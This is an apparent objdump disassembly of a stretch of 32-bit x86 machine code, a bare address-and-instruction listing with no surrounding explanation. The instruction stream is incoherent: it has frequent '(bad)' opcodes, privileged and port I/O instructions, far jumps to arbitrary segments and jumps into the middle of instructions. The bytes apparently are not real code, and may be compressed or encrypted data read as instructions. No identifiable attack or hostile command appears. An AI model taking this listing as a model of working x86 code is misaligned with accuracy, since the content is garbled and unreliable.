  40cc6e:	or     esi,DWORD PTR [esi]
  40cc70:	mov    eax,0xdbd1cf1c
  40cc75:	pop    es
  40cc76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc77:	popa   
  40cc78:	mov    eax,0xb2aed97c
  40cc7d:	inc    ecx
  40cc7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc7f:	jmp    0x81cc:0x3807cb1f
  40cc86:	push   0xdd88fe96
  40cc8b:	lods   al,BYTE PTR ds:[esi]
  40cc8c:	scas   eax,DWORD PTR es:[edi]
  40cc8d:	arpl   WORD PTR [edx],si
  40cc8f:	cmp    ch,bl
  40cc91:	and    edx,DWORD PTR [esi]
  40cc93:	test   eax,0xcafe5bf9
  40cc98:	jmp    0x40cc5a
  40cc9a:	loop   0x40ccd9
  40cc9c:	sub    al,0xd
  40cc9e:	push   ebx
  40cc9f:	mov    al,ds:0x13e3f682
  40cca4:	pop    edx
  40cca5:	test   eax,0x720dd850
  40ccaa:	out    0x82,eax
  40ccac:	enter  0xa501,0xaf
  40ccb0:	test   DWORD PTR [ebx],edi
  40ccb2:	xor    bh,BYTE PTR [eax-0x1326ef78]
  40ccb8:	inc    eax
  40ccb9:	add    BYTE PTR [ebx-0x58],cl
  40ccbc:	mov    cl,0x16
  40ccbe:	xchg   esp,eax
  40ccbf:	adc    dh,al
  40ccc1:	push   edx
  40ccc2:	xor    eax,0x5d202efc
  40ccc7:	out    dx,eax
  40ccc8:	push   es
  40ccc9:	iret   
  40ccca:	mov    edi,0x9229f172
  40cccf:	mov    ds:0x133f5527,al
  40ccd4:	lahf   
  40ccd5:	xor    ebx,DWORD PTR [ebp+0x44]
  40ccd8:	shl    BYTE PTR [edx+0x529e3312],0xae
  40ccdf:	shl    dh,cl
  40cce1:	test   al,0xef
  40cce3:	test   DWORD PTR [edi],ebp
  40cce5:	ficom  DWORD PTR [eax-0x110dd352]
  40cceb:	adc    al,dh
  40cced:	sar    esi,cl
  40ccef:	js     0x40cd6b
  40ccf1:	loope  0x40cce1
  40ccf3:	(bad)  
  40ccf4:	xchg   ecx,eax
  40ccf5:	mov    ecx,0xaad30b17
  40ccfa:	jg     0x40ccc1
  40ccfc:	cmp    DWORD PTR [edx],0x70dedfe9
  40cd02:	leave  
  40cd03:	cwde   
  40cd04:	xchg   BYTE PTR [ecx+esi*4],cl
  40cd07:	sti    
  40cd08:	outs   dx,DWORD PTR ds:[esi]
  40cd09:	mov    ah,0xe7
  40cd0b:	jmp    0x40ccc5
  40cd0d:	inc    esi
  40cd0e:	inc    esi
  40cd0f:	add    ah,BYTE PTR [ebx]
  40cd11:	loope  0x40cc97
  40cd13:	outs   dx,DWORD PTR ds:[esi]
  40cd14:	adc    cl,0xa0
  40cd17:	or     esp,esi
  40cd19:	ror    DWORD PTR [eax],cl
  40cd1b:	mov    ah,0xc7
  40cd1d:	xor    eax,0xb91d1df8
  40cd22:	sbb    edi,eax
  40cd24:	retf   
  40cd25:	jmp    0x4f23:0x4f527f50
  40cd2c:	retf   
  40cd2d:	cli    
  40cd2e:	mov    bl,BYTE PTR [edi+edx*8+0x1b]
  40cd32:	lea    edx,[edi+0x7c]
  40cd35:	das    
  40cd36:	clc    
  40cd37:	stos   DWORD PTR es:[edi],eax
  40cd38:	jnp    0x40cd70
  40cd3a:	xor    BYTE PTR [eax-0x6d],ch
  40cd3d:	push   ss
  40cd3e:	jb     0x40cd0b
  40cd40:	in     eax,0x48
  40cd42:	jno    0x40ccf1
  40cd44:	scas   eax,DWORD PTR es:[edi]
  40cd45:	or     esi,DWORD PTR [edx-0x30be0636]
  40cd4b:	in     eax,dx
  40cd4c:	test   eax,0x18dd677f
  40cd51:	adc    dl,BYTE PTR [esp+edi*8+0x77]
  40cd55:	retf   
  40cd56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd57:	call   0xa706e83f
  40cd5c:	push   edx
  40cd5d:	into   
  40cd5e:	jmp    0x40ccef
  40cd60:	(bad)  
  40cd61:	popa   
  40cd62:	add    al,0xe0
  40cd64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd65:	sub    eax,0x22cec0a3
  40cd6a:	pop    ss
  40cd6b:	loope  0x40cdb0
  40cd6d:	sbb    eax,0x719a5bfb
  40cd72:	add    al,0x41
  40cd74:	xchg   edi,eax
  40cd75:	push   ecx
  40cd76:	jae    0x40cdd5
  40cd78:	or     al,0x41
  40cd7a:	or     eax,0x2d246392
  40cd7f:	jle    0x40cda6
  40cd81:	sub    esp,esp
  40cd83:	lahf   
  40cd84:	mul    BYTE PTR [ebp+0x53b66c04]
  40cd8a:	fnstenv [edx]
  40cd8c:	test   eax,0x854c3919
  40cd91:	pop    ecx
  40cd92:	mov    bh,0x13
  40cd94:	(bad)  
  40cd95:	ret    
  40cd96:	repz das 
  40cd98:	sub    ah,BYTE PTR [ecx]
  40cd9a:	scas   eax,DWORD PTR es:[edi]
  40cd9b:	jle    0x40cd3b
  40cd9d:	(bad)  
  40cd9e:	out    0x63,eax
  40cda0:	add    DWORD PTR [ecx-0x6ea874d],ebx
  40cda6:	data16 adc BYTE PTR [bp-0x3c],ah
  40cdab:	sbb    ebp,DWORD PTR [edi-0x5ff7559]
  40cdb1:	xchg   edx,eax
  40cdb2:	std    
  40cdb3:	xchg   ebp,eax
  40cdb4:	jg     0x40ce25
  40cdb6:	and    al,0xb0
  40cdb8:	or     eax,0xaf62259e
  40cdbd:	shl    BYTE PTR [ebp+0x3f6b7a11],0x3d
  40cdc4:	js     0x40cdbb
  40cdc6:	or     ebp,edx
  40cdc8:	inc    ecx
  40cdc9:	fadd   DWORD PTR [edx]
  40cdcb:	xchg   ecx,eax
  40cdcc:	dec    eax
  40cdcd:	shr    BYTE PTR [eax],0xce
  40cdd0:	arpl   WORD PTR ds:0x4d9f03a8,bp
  40cdd6:	(bad)  [ebx-0x3b]
  40cdda:	pop    ebx
  40cddb:	adc    bl,BYTE PTR [edx]
  40cddd:	popf   
  40cdde:	clc    
  40cddf:	sub    BYTE PTR [esi-0x317ca3a0],ah
  40cde5:	sub    esi,DWORD PTR [esi-0x66]
  40cde8:	jmp    0xbed4:0x7cf6d4b2
  40cdef:	cs push 0x20c93855
  40cdf5:	xor    BYTE PTR [ecx+0x3d5f2a17],ch
  40cdfb:	xor    ecx,DWORD PTR [ebx-0x41]
  40cdfe:	pop    ebx
  40cdff:	push   0x613ef4b6
  40ce04:	loope  0x40cdbe
  40ce06:	stos   BYTE PTR es:[edi],al
  40ce07:	xchg   esp,eax
  40ce08:	stos   DWORD PTR es:[edi],eax
  40ce09:	jmp    0x40cdc2
  40ce0b:	jo     0x40cdd6
  40ce0d:	test   eax,0x624108e0
  40ce12:	les    ebp,FWORD PTR [edx-0x399d3c42]
  40ce18:	paddusw mm4,QWORD PTR [ebp-0x67]
  40ce1c:	jmp    0x4dd6:0x34e7d988
  40ce23:	add    dh,dl
  40ce25:	mov    dh,al
  40ce27:	data16 sub BYTE PTR [eax],dh
  40ce2a:	(bad)  
  40ce2b:	loopne 0x40cde9
  40ce2d:	push   esp
  40ce2e:	in     eax,dx
  40ce2f:	pusha  
  40ce30:	call   0xc69efc4a
  40ce35:	push   edx
  40ce36:	daa    
  40ce37:	xchg   ebp,eax
  40ce38:	bound  edx,QWORD PTR [ebp-0x52c0eab2]
  40ce3e:	cld    
  40ce3f:	push   esp
  40ce41:	inc    edx
  40ce42:	xor    BYTE PTR [ebx-0x6c],cl
  40ce45:	xor    DWORD PTR [edx],edi
  40ce47:	shl    ebp,1
  40ce49:	jmp    0x82cec3b6
  40ce4e:	ja     0x40ce03
  40ce50:	in     eax,0x9b
  40ce52:	or     ebx,DWORD PTR [edi-0x801243f]
  40ce58:	push   edx
  40ce59:	adc    eax,0x9106d6fe
  40ce5e:	sub    al,0x5b
  40ce60:	or     eax,0xb1d07dce
  40ce65:	ins    BYTE PTR es:[edi],dx
  40ce66:	call   0x5cc4:0x64299b3e
  40ce6d:	sbb    DWORD PTR [edi+0x655010fa],0xffffffa5
  40ce74:	(bad)  
  40ce75:	out    0x5f,eax
  40ce77:	pop    edx
  40ce78:	sbb    ah,BYTE PTR [eax+0x4033c66c]
  40ce7e:	or     dh,BYTE PTR [edi+0x73]
  40ce81:	test   eax,0xac5ed775
  40ce86:	push   ss
  40ce87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce88:	loop   0x40ceed
  40ce8a:	mov    bh,0x46
  40ce8c:	call   0xba349842
  40ce91:	or     dh,0xd3
  40ce94:	iret   
  40ce95:	sub    eax,0x81837c5b
  40ce9a:	fwait
  40ce9b:	arpl   WORD PTR [ebp-0x4df04dd4],cx
  40cea1:	gs push ecx
  40cea3:	push   ebp
  40cea4:	mov    DWORD PTR [edi-0x6946969e],ecx
  40ceaa:	lea    ecx,[esi]
  40ceac:	ret    
  40cead:	push   eax
  40ceae:	push   0x30
  40ceb0:	(bad)  
  40ceb1:	xchg   esi,eax
  40ceb2:	add    eax,0xd6bdf5a2
  40ceb7:	sbb    al,0x8e
  40ceb9:	mov    esi,0x3272ec
  40cebe:	jmp    0x40f242
  40cec3:	mov    cs:0xd0afdcaf,eax
  40cec9:	add    DWORD PTR [ebx+0x287882c5],eax
  40cecf:	icebp  
  40ced0:	sub    BYTE PTR [edx+0x7acdad1e],0x7a
  40ced7:	adc    ebx,DWORD PTR [edi+0x7a]
  40ceda:	jp     0x40ce66
  40cedc:	ficom  WORD PTR [si]
  40cedf:	dec    edi
  40cee0:	sbb    eax,0xef648c9c
  40cee5:	jp     0x40cf4b
  40cee7:	jbe    0x40cf15
  40cee9:	xor    al,0xed
  40ceeb:	push   ss
  40ceec:	loopne 0x40ce6f
  40ceee:	popa   
  40ceef:	pop    edx
  40cef0:	mov    ds:0x56b356ca,eax
  40cef5:	or     al,0x92
  40cef7:	push   edx
  40cef8:	or     ecx,esp
  40cefa:	sbb    al,BYTE PTR [eax]
  40cefc:	call   0x65616ec
  40cf01:	mov    dh,0xf
  40cf03:	sub    al,0xc7
  40cf05:	mov    al,0x1d
  40cf07:	mov    esi,0xcfbd66ce
  40cf0c:	loop   0x40cf3e
  40cf0e:	inc    ecx
  40cf0f:	add    bh,BYTE PTR [edi]
  40cf11:	sbb    eax,DWORD PTR [esi]
  40cf13:	lods   eax,DWORD PTR ds:[esi]
  40cf14:	cli    
  40cf15:	aam    0x86
  40cf17:	cmp    BYTE PTR [ebp+0x11725690],dh
  40cf1d:	or     ebx,DWORD PTR [eax+0x627fe48f]
  40cf23:	loop   0x40cf26
  40cf25:	add    DWORD PTR [esi-0x3aeba31],edx
  40cf2b:	add    DWORD PTR [edi-0x3ac983c9],ecx
  40cf31:	es jge 0x40cf99
  40cf34:	ret    0xbc9
  40cf37:	cld    
  40cf38:	lods   al,BYTE PTR ds:[esi]
  40cf39:	and    DWORD PTR [ebp+0x7a61d9af],esi
  40cf3f:	xchg   ebp,eax
  40cf40:	cmp    esp,DWORD PTR [edx-0x44e3da00]
  40cf46:	sub    DWORD PTR [eax+0x6f],ebp
  40cf49:	imul   edx,DWORD PTR [ecx-0x69],0x26771040
  40cf50:	popf   
  40cf51:	enter  0x33a4,0x3d
  40cf55:	pop    edi
  40cf56:	or     al,0xd4
  40cf58:	pop    es
  40cf59:	fwait
  40cf5a:	sahf   
  40cf5b:	adc    eax,0xa10b37c4
  40cf60:	sahf   
  40cf61:	sbb    ecx,DWORD PTR [ecx+0x4e4b1900]
  40cf67:	cmp    eax,0xe80ed6a6
  40cf6c:	sbb    al,0x7f
  40cf6e:	mov    ah,0xc
  40cf70:	lds    edx,FWORD PTR [ebp-0x52]
  40cf73:	mov    ecx,0xcb20f989
  40cf78:	dec    edx
  40cf79:	mov    ds:0x1c1f6893,al
  40cf7e:	push   0x2e
  40cf80:	jbe    0x40cf53
  40cf82:	adc    eax,0x904ad35c
  40cf87:	cwde   
  40cf88:	pop    ss
  40cf89:	stos   DWORD PTR es:[edi],eax
  40cf8a:	out    0x10,eax
  40cf8c:	lock das 
  40cf8e:	mov    esi,esp
  40cf90:	sub    esp,DWORD PTR [edx+eax*1+0x56]
  40cf94:	mov    ds:0x39d625b8,al
  40cf99:	mov    esi,0xce343d97
  40cf9e:	push   0x85842ee2
  40cfa3:	sub    al,0xba
  40cfa5:	js     0x40cf2c
  40cfa7:	sar    BYTE PTR ds:0xf2d7e147,1
  40cfad:	repz sbb DWORD PTR [eax+0x54],ebx
  40cfb1:	hlt    
  40cfb2:	cld    
  40cfb3:	add    DWORD PTR [ebp-0x25],0x35
  40cfb7:	mov    edi,0x1c4b1cd6
  40cfbc:	jno    0x40d00a
  40cfbe:	icebp  
  40cfbf:	lds    edx,FWORD PTR [ebx-0x59]
  40cfc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cfc3:	(bad)  
  40cfc4:	into   
  40cfc5:	adc    ebx,DWORD PTR [ebp+0x73]
  40cfc8:	cmp    BYTE PTR [edx],dh
  40cfca:	dec    esi
  40cfcb:	fidivr DWORD PTR [esi-0x2b]
  40cfce:	inc    ebp
  40cfcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfd0:	xchg   esi,eax
  40cfd1:	mov    WORD PTR [edx],es
  40cfd3:	cmc    
  40cfd4:	sub    al,0x73
  40cfd6:	loopne 0x40cf82
  40cfd8:	mov    ebp,0x679475cf
  40cfdd:	(bad)  
  40cfde:	out    0x40,eax
  40cfe0:	ret    0xbe9f
  40cfe3:	add    edx,DWORD PTR [esi]
  40cfe5:	stos   BYTE PTR es:[edi],al
  40cfe6:	and    al,0x63
  40cfe8:	push   edi
  40cfe9:	test   al,0xbd
  40cfeb:	mov    ds:0x11d25072,al
  40cff0:	sbb    al,cl
  40cff2:	loopne 0x40d004
  40cff4:	ret    
  40cff5:	es loopne 0x40cf7a
  40cff8:	xor    al,0x19
  40cffa:	or     eax,0x923ff864
  40cfff:	sbb    BYTE PTR [esi+eiz*2],ah
  40d002:	add    eax,0x3b580df0
  40d007:	push   esi
  40d008:	add    ecx,DWORD PTR [ebp+0x4459df78]
  40d00e:	add    dl,dh
  40d010:	(bad)  
  40d011:	aaa    
  40d012:	ret    
  40d013:	stos   DWORD PTR es:[edi],eax
  40d014:	xor    DWORD PTR [ebp-0x18],ebx
  40d017:	push   esp
  40d018:	dec    ebx
  40d019:	in     al,dx
  40d01a:	pop    es
  40d01b:	mov    eax,ds:0x5a314258
  40d020:	aad    0x71
  40d022:	arpl   dx,si
  40d024:	imul   esi,DWORD PTR [eax],0x583a4210
  40d02a:	and    eax,DWORD PTR [ebx+0x5de76d08]
  40d030:	fst    DWORD PTR [ebx+0x1d5b24d7]
  40d036:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d037:	sub    dh,BYTE PTR [edx]
  40d039:	test   DWORD PTR [esi+0x4f936d1a],esp
  40d03f:	pop    ebx
  40d040:	push   0x5a
  40d042:	fwait
  40d043:	jmp    0xf3c46ad9
  40d048:	iret   
  40d049:	add    DWORD PTR [edx-0x71],ebx
  40d04c:	push   0x84c07e2a
  40d051:	jge    0x40d05e
  40d053:	mov    cl,0x9f
  40d055:	adc    BYTE PTR [eax+0x5851b94b],dh
  40d05b:	cmp    bh,BYTE PTR [ecx]
  40d05d:	sub    eax,ecx
  40d05f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d060:	add    dh,dl
  40d062:	sar    BYTE PTR [eax],1
  40d064:	mov    dh,0x1f
  40d066:	dec    edi
  40d067:	ret    
  40d068:	and    BYTE PTR [edi+edi*2+0x4289847a],al
  40d06f:	pop    edi
  40d070:	dec    eax
  40d071:	jmp    0xdc2374b1
  40d076:	pop    esp
  40d077:	loopne 0x40d0d2
  40d079:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d07a:	cmp    esp,ebx
  40d07c:	in     eax,0x9d
  40d07e:	outs   dx,BYTE PTR ds:[esi]
  40d07f:	ret    
  40d080:	sub    bh,ah
  40d082:	fiadd  WORD PTR [ebx-0x73]
  40d085:	je     0x40d02e
  40d087:	and    edx,DWORD PTR [ebx]
  40d089:	push   ecx
  40d08a:	jne    0x40d05c
  40d08c:	or     DWORD PTR [ebp-0x75],edi
  40d08f:	jo     0x40d067
  40d091:	add    al,0x51
  40d093:	push   0x1e78150b
  40d098:	neg    BYTE PTR [eax+0x35]
  40d09b:	mov    DWORD PTR [ebx+edx*2],ebp
  40d09e:	pop    es
  40d09f:	cwde   
  40d0a0:	mov    ch,0x82
  40d0a2:	leave  
  40d0a3:	mov    esi,0xa264786
  40d0a8:	pop    edi
  40d0a9:	adc    esi,ecx
  40d0ab:	and    al,0x38
  40d0ad:	into   
  40d0ae:	inc    esi
  40d0af:	repnz sti 
  40d0b1:	mov    DWORD PTR [ecx-0xd],ecx
  40d0b4:	gs int3 
  40d0b6:	xor    eax,0x39591917
  40d0bb:	lea    esi,[esi]
  40d0bd:	mov    ecx,DWORD PTR [edi+edx*8+0x6a76d510]
  40d0c4:	xor    al,0xe4
  40d0c7:	mul    BYTE PTR [esi-0x4a]
  40d0ca:	xchg   esp,eax
  40d0cb:	imul   ebx,DWORD PTR [ebx],0xffffffd9
  40d0ce:	sbb    al,0x80
  40d0d0:	ss cmp eax,0xabbbe66b
  40d0d6:	in     eax,dx
  40d0d7:	mov    al,0x13
  40d0d9:	dec    ebx
  40d0da:	push   0x28
  40d0dc:	xchg   edx,eax
  40d0dd:	aaa    
  40d0de:	jmp    0x6714d01
  40d0e3:	mov    edi,0xfd2eb6f6
  40d0e8:	add    eax,0x1d915237
  40d0ed:	cs in  al,0xef
  40d0f0:	out    dx,eax
  40d0f1:	mov    esp,eax
  40d0f3:	imul   ecx,DWORD PTR [esi-0x5a],0xd
  40d0f7:	push   ebx
  40d0f8:	or     dh,BYTE PTR [ecx+0x68]
  40d0fb:	stc    
  40d0fc:	or     edi,esi
  40d0fe:	(bad)  
  40d0ff:	pop    esi
  40d100:	fsub   QWORD PTR [eax+0x481de5d7]
  40d106:	sbb    bh,BYTE PTR [edi]
  40d108:	bound  ebx,QWORD PTR [esi+0x66]
  40d10b:	lods   eax,DWORD PTR ds:[esi]
  40d10c:	add    ecx,edx
  40d10e:	fcomp  DWORD PTR [ebx]
  40d110:	pop    esp
  40d111:	jne    0x40d153
  40d113:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d114:	test   al,0x47
  40d116:	pop    edx
  40d117:	sub    DWORD PTR [ebx],esp
  40d119:	inc    esi
  40d11a:	lock adc DWORD PTR [edi],esi
  40d11d:	adc    BYTE PTR ds:0xaf513249,ah
  40d123:	in     eax,0x27
  40d125:	js     0x40d0e7
  40d127:	outs   dx,BYTE PTR ds:[esi]
  40d128:	rol    DWORD PTR [ebx-0x1a2bd6f],0x3e
  40d12f:	popa   
  40d130:	mov    ah,0xad
  40d132:	ss int 0xf5
  40d135:	test   al,0x3f
  40d137:	dec    esi
  40d138:	jmp    0xe46c:0x43a4723f
  40d13f:	mov    ch,cl
  40d141:	mov    DWORD PTR [esi],ecx
  40d143:	pop    ecx
  40d144:	mov    ch,0x53
  40d146:	mov    WORD PTR [edx+0x34],fs
  40d149:	fwait
  40d14a:	jmp    0x4fa8a0fd
  40d14f:	cmp    eax,0xdb5d6756
  40d154:	pop    edx
  40d155:	add    DWORD PTR [ecx],esi
  40d157:	add    ecx,DWORD PTR [edi+0x7fe23246]
  40d15d:	adc    ebp,ecx
  40d15f:	ret    0x2fd0
  40d162:	mov    ch,0xf2
  40d164:	(bad)  
  40d165:	xor    DWORD PTR [edx],0xb
  40d168:	por    mm5,QWORD PTR [edx+0x11]
  40d16c:	fwait
  40d16d:	aad    0x75
  40d16f:	or     ebp,ecx
  40d171:	stos   BYTE PTR es:[edi],al
  40d172:	push   0x523993b7
  40d177:	arpl   ax,sp
  40d179:	push   cs
  40d17a:	fwait
  40d17b:	into   
  40d17c:	mov    dl,0x40
  40d17e:	xchg   BYTE PTR [edx],dl
  40d180:	sbb    BYTE PTR [esp+edx*8],bl
  40d183:	inc    ebx
  40d184:	jp     0x40d1ea
  40d186:	pop    es
  40d187:	pop    edi
  40d188:	fstp   st(7)
  40d18a:	ret    0x8acb
  40d18d:	jmp    0x41dade89
  40d192:	enter  0xf9d1,0x35
  40d196:	popa   
  40d197:	xchg   ecx,eax
  40d198:	mov    dh,0x17
  40d19a:	mov    ebx,0x62793a10
  40d19f:	and    cl,BYTE PTR [esi]
  40d1a1:	cld    
  40d1a2:	addr16 cdq 
  40d1a4:	lods   al,BYTE PTR ds:[esi]
  40d1a5:	push   ebx
  40d1a6:	popa   
  40d1a7:	daa    
  40d1a8:	adc    ecx,DWORD PTR [eax-0x5b]
  40d1ab:	jecxz  0x40d21c
  40d1ad:	clc    
  40d1ae:	pop    es
  40d1af:	sub    ah,dl
  40d1b1:	in     al,dx
  40d1b2:	mov    ecx,0xcc1bf777
  40d1b7:	fmul   st(5),st
  40d1b9:	add    eax,0x4cade5a
  40d1be:	pop    ebp
  40d1bf:	xor    al,0xd
  40d1c1:	loope  0x40d17e
  40d1c3:	or     BYTE PTR [edi],bh
  40d1c5:	jecxz  0x40d1ff
  40d1c7:	pop    esp
  40d1c8:	das    
  40d1c9:	add    eax,DWORD PTR [ecx+0x20d89a99]
  40d1cf:	cmp    cl,BYTE PTR [ebx+ecx*2]
  40d1d2:	push   0xffffffdc
  40d1d4:	es cmp ah,dh
  40d1d7:	sbb    DWORD PTR [eax-0x27],edi
  40d1da:	add    al,0x62
  40d1dc:	lods   al,BYTE PTR ds:[esi]
  40d1dd:	mov    ebp,0x14fbe3e9
  40d1e2:	push   ecx
  40d1e3:	shl    DWORD PTR [eax+0x35],1
  40d1e6:	mov    eax,ds:0x5dd46f30
  40d1eb:	ins    BYTE PTR es:[edi],dx
  40d1ec:	jle    0x40d225
  40d1ee:	out    dx,eax
  40d1ef:	loopne 0x40d234
  40d1f1:	inc    edi
  40d1f2:	dec    ebp
  40d1f3:	cmc    
  40d1f4:	sub    DWORD PTR [edi],eax
  40d1f6:	xchg   esp,eax
  40d1f7:	xchg   esi,eax
  40d1f8:	lahf   
  40d1f9:	les    ebx,FWORD PTR [edi-0x1a]
  40d1fc:	loopne 0x40d26e
  40d1fe:	push   eax
  40d1ff:	xchg   ecx,eax
  40d200:	cld    
  40d201:	shl    BYTE PTR [edi],1
  40d203:	out    dx,eax
  40d204:	rcr    ch,cl
  40d206:	xlat   BYTE PTR ds:[ebx]
  40d207:	inc    ecx
  40d208:	cmp    edi,DWORD PTR [edi-0x33]
  40d20b:	sti    
  40d20c:	outs   dx,DWORD PTR ds:[esi]
  40d20d:	cwde   
  40d20e:	retf   
  40d20f:	or     BYTE PTR ds:0xbb9d307b,cl
  40d215:	mov    ?,WORD PTR [ecx+0xf]
  40d218:	repz jg 0x40d1c7
  40d21b:	dec    eax
  40d21c:	outs   dx,DWORD PTR ds:[esi]
  40d21d:	fldenv [edi-0x7340d1fa]
  40d223:	test   BYTE PTR [edi-0x15],0x50
  40d227:	push   es
  40d228:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d229:	dec    esi
  40d22a:	rol    cl,1
  40d22c:	(bad)  
  40d22d:	jnp    0x40d260
  40d22f:	jge    0x40d2a9
  40d231:	aaa    
  40d232:	jbe    0x40d241
  40d234:	out    0xc6,eax
  40d236:	and    al,BYTE PTR [eax]
  40d238:	outs   dx,DWORD PTR ds:[esi]
  40d239:	outs   dx,DWORD PTR ds:[esi]
  40d23a:	and    al,0xba
  40d23c:	shl    DWORD PTR [eax+0x5f],1
  40d23f:	inc    ebx
  40d240:	imul   ecx,DWORD PTR ds:0xd3154baa,0xffffffaf
  40d247:	xor    eax,0xfe7a83cd
  40d24c:	dec    ecx
  40d24d:	mov    ds:0xf1cc1531,eax
  40d252:	mov    eax,cs
  40d254:	mov    edx,0x774ca9d6
  40d259:	ret    
  40d25a:	bnd jle 0x40d22f
  40d25d:	and    DWORD PTR [ecx-0x62fbdd7b],ecx
  40d263:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d264:	cdq    
  40d265:	fld    TBYTE PTR [esi-0x6fb0fbd9]
  40d26b:	inc    edx
  40d26c:	fcomi  st,st(5)
  40d26e:	(bad)  
  40d26f:	and    DWORD PTR [edx-0x19937548],esp
  40d275:	sbb    DWORD PTR [edx+eiz*1-0x432a1881],esp
  40d27c:	sbb    DWORD PTR [edi+0x40],ebx
  40d27f:	sti    
  40d280:	loopne 0x40d2dc
  40d282:	mov    esp,0x3f4837e5
  40d287:	call   0x4cb96763
  40d28c:	mov    esp,0xf1acd892
  40d291:	mov    ds:0xdf7f4a1c,al
  40d296:	xor    bh,BYTE PTR ds:0xfbabab9c
  40d29c:	pop    ecx
  40d29d:	sbb    ebx,0xd
  40d2a0:	lock call 0xaa92cc
  40d2a6:	call   0x9646:0x8a5e873a
  40d2ad:	sub    DWORD PTR [edx+0x69],ebx
  40d2b0:	jmp    0x40d2cd
  40d2b2:	mov    bh,0x3b
  40d2b4:	dec    sp
  40d2b6:	test   DWORD PTR cs:[esi-0x3304ab7c],ebp
  40d2bd:	push   ss
  40d2be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2bf:	loope  0x40d2d2
  40d2c1:	pop    edx
  40d2c2:	inc    edi
  40d2c3:	enter  0xea53,0x31
  40d2c7:	lods   eax,DWORD PTR ds:[esi]
  40d2c8:	test   dh,ah
  40d2ca:	call   0xd154:0x3a74ee17
  40d2d1:	xor    ah,BYTE PTR ds:0xdd805db0
  40d2d7:	pushf  
  40d2d8:	sub    esi,edi
  40d2da:	dec    edi
  40d2db:	sbb    ah,bh
  40d2dd:	ss pusha 
  40d2df:	inc    esp
  40d2e0:	xchg   DWORD PTR [eax+esi*4],eax
  40d2e3:	mov    ebp,tr6
  40d2e6:	mov    cl,0x73
  40d2e8:	jae    0x40d27e
  40d2ea:	ror    ch,0x19
  40d2ed:	scas   al,BYTE PTR es:[edi]
  40d2ee:	sub    BYTE PTR [edx+0x65c301ae],ah
  40d2f4:	pop    ebx
  40d2f5:	and    BYTE PTR [edx+0x78e39261],bl
  40d2fb:	xor    DWORD PTR [edi+0x43],ecx
  40d2fe:	push   ecx
  40d2ff:	and    ah,bh
  40d301:	mov    ebx,0x9aa0f49d
  40d306:	xor    al,0x32
  40d308:	mov    esp,0x6efdfce9
  40d30d:	dec    edx
  40d30e:	cs scas eax,DWORD PTR es:[edi]
  40d310:	add    eax,DWORD PTR [esi-0x6dbec10e]
  40d316:	push   eax
  40d317:	adc    edx,DWORD PTR [edi]
  40d319:	leave  
  40d31a:	pop    eax
  40d31b:	mov    cl,0x97
  40d31d:	fadd   QWORD PTR [esi+0x2a]
  40d320:	retf   
  40d321:	jb     0x40d360
  40d323:	jb     0x40d302
  40d325:	and    al,0x49
  40d327:	inc    esi
  40d328:	icebp  
  40d329:	xor    DWORD PTR [edx-0x17],0xfffffff6
  40d32d:	jnp    0x40d2c5
  40d32f:	adc    al,0x9d
  40d331:	pushf  
  40d332:	and    ecx,DWORD PTR [edi+0xf]
  40d335:	pop    es
  40d336:	lahf   
  40d337:	es in  al,0x1e
  40d33a:	mov    al,0xa2
  40d33c:	cmp    ebx,DWORD PTR [esi+0x30]
  40d33f:	add    eax,0xc0691910
  40d344:	xchg   edx,eax
  40d345:	xor    cl,BYTE PTR [esi+0x7f]
  40d348:	sub    ebp,edx
  40d34a:	aam    0x2e
  40d34c:	loopne 0x40d3ae
  40d34e:	push   edi
  40d34f:	int3   
  40d350:	mov    ds:0x48a019e,eax
  40d355:	out    0x89,eax
  40d357:	call   0x465ff0de
  40d35c:	push   0xffffff8a
  40d35e:	pop    eax
  40d35f:	jbe    0x40d35c
  40d361:	jne    0x40d350
  40d363:	mov    edx,ss
  40d365:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d366:	mov    al,0xac
  40d368:	in     al,0xb
  40d36a:	mov    esp,0x3869aec4
  40d36f:	xchg   esp,eax
  40d370:	pop    ecx
  40d371:	cld    
  40d372:	inc    edi
  40d373:	pop    esi
  40d374:	repz sbb al,0x93
  40d377:	repz in al,0xef
  40d37a:	xchg   BYTE PTR [eax+ebx*4],bl
  40d37d:	pop    esi
  40d37e:	popa   
  40d37f:	mov    ecx,0xd1a2e94e
  40d384:	std    
  40d385:	stos   DWORD PTR es:[edi],eax
  40d386:	dec    esp
  40d387:	xchg   esp,eax
  40d388:	ss push ebx
  40d38a:	push   ecx
  40d38b:	hlt    
  40d38c:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40d38e:	frstor [esi-0x46e688f4]
  40d394:	(bad)
  40d399:	test   BYTE PTR [ebx+0x24],al
  40d39c:	ja     0x40d37c
  40d39e:	jg     0x40d400
  40d3a0:	sub    BYTE PTR [ecx],al
  40d3a2:	or     eax,0x4f2df47c
  40d3a7:	lock jno 0x40d3d8
  40d3aa:	daa    
  40d3ab:	push   ebp
  40d3ac:	pushf  
  40d3ad:	pop    es
  40d3ae:	cmp    DWORD PTR ds:0x6c16744c,ebx
  40d3b4:	inc    eax
  40d3b5:	inc    ebp
  40d3b6:	les    ecx,FWORD PTR [esi]
  40d3b8:	inc    edi
  40d3b9:	sbb    eax,DWORD PTR [ecx-0x7c587a4b]
  40d3bf:	jl     0x40d3a6
  40d3c1:	and    cl,bl
  40d3c3:	(bad)  
  40d3c4:	int    0x38
  40d3c6:	stos   DWORD PTR es:[edi],eax
  40d3c7:	imul   edi,DWORD PTR [ecx],0x3c4620ab
  40d3cd:	mov    edx,0xdc629b7e
  40d3d2:	enter  0x36ac,0x9c
  40d3d6:	dec    edx
  40d3d7:	push   ss
